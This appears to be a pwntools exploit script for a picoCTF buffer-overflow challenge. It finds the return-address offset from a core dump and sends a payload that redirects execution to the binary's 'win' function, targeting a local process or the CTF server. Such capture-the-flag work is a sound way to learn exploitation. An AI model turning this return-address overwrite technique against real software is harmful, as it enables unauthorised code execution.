"""
Different from using gdb find offset
We use pwntools automating the stack (by coredump)
"""

from pwn import *

elf = context.binary = ELF('./vuln1', checksec=False)

# Set up connection setting
host, port = 'saturn.picoctf.net', 60057

# To get core file
# p = process(elf.path)
# p.sendline(cyclic(100))
# p.wait()

# Path depends on your setting (check /proc/sys/kernel/core_pattern)
core = Coredump('/tmp/core/core.vuln1.1760.1707695666')

payload = flat({
    cyclic_find(core.eip): elf.symbols.win  # offset:address(func)
})

# connect remote by `python3 vuln1.2.py REMOTE`
if args.REMOTE:
    p = remote(host, port)
else:
    p = process('./vuln1')

p.sendline(payload)
p.interactive()
